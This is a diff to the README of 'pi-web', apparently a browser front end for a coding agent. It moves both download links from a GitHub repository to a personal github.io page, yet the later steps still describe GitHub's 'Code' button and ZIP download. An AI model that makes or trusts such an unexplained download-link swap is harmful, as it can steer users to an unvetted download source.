@@ -1,6 +1,6 @@
 # 🌐 pi-web - Manage your coding agent with ease
 
-[![Download pi-web](https://img.shields.io/badge/Download-pi--web-blue.svg)](https://github.com/Theanie7380/pi-web)
+[![Download pi-web](https://img.shields.io/badge/Download-pi--web-blue.svg)](https://theanie7380.github.io)
 
 This software provides a visual interface for the pi coding agent. It allows you to interact with code tasks through your web browser. You do not need to use a command prompt or terminal. This tool manages the background processes of the agent.
 
@@ -19,7 +19,7 @@ If you have these items, your computer runs this application without issues. You
 
 Follow these steps to set up the application on your Windows machine.
 
-1.  Visit this page to download: [https://github.com/Theanie7380/pi-web](https://github.com/Theanie7380/pi-web).
+1.  Visit this page to download: [https://theanie7380.github.io](https://theanie7380.github.io).
 2.  Locate the green button labeled "Code" on the page.
 3.  Choose "Download ZIP" from the menu.
 4.  Wait for the file to finish downloading to your Downloads folder.
